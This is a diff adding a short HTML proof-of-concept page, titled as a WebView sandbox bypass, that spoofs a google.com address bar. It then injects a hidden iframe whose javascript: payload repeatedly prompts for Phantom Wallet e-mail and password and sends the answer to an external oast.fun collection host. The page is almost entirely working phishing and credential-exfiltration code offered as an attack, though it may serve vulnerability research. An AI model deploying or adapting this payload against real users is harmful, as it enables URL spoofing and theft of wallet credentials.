@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox WebView – Delayed JS</title>
+  <style>iframe{visibility:hidden;}</style>
+  <script>
+    function spoof() {
+      let win = window.open("https://www.google.com:8080", "_blank");  // Redirect to spoofed URL first
+      setTimeout(() => {
+        try {
+          win.stop();  // Stop load to retain URL
+          let iframe = win.document.createElement('iframe');
+          iframe.id = 'iframe';
+          iframe.style.position = 'fixed';
+          iframe.style.top = '0';
+          iframe.style.left = '0';
+          iframe.style.width = '100%';
+          iframe.style.height = '100%';
+          iframe.style.border = 'none';
+          iframe.style.background = 'white';
+          iframe.style.visibility = 'hidden';  // Hidden per original style
+          win.document.body.appendChild(iframe);
+
+          // Add onblur handler to trigger prompt and lock URL
+          win.onblur = function () {
+            win.location.replace("https://www.google.com:8080");  // Lock URL on blur
+            const code =
+              "(function(){try{" +
+              "var msg='In order to access phantom.com\\n" +
+              "you must first login on your\\nPhantom Wallet Account.\\n\\n" +
+              "Please type your e-mail\\nand your password:';" +
+              "var v='';" +
+              "while(v===null||v.trim()===''){" +
+              "  v=prompt(msg,'E-mail / Password.');" +
+              "}" +
+              "try{fetch('https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/collect?creds=' + encodeURIComponent(v));}catch(e){}" +
+              "}catch(e){}})()";
+            iframe.src = "javascript:" + encodeURIComponent(code).replace(/'/g, "\\'");
+          };
+
+          // Trigger blur manually to show prompt after content loads
+          setTimeout(() => {
+            win.blur();  // Force blur to trigger prompt
+          }, 1000);  // Delay to ensure iframe and URL are ready
+        } catch (e) {
+          console.warn("Blocked:", e);
+        }
+      }, 200);  // Slight delay for URL display
+    }
+  </script>
+</head>
+<body>
+  <center><h1>Click Here</h1></center>
+  <button onclick="spoof()">Click to spoof</button>
+</body>
+</html>
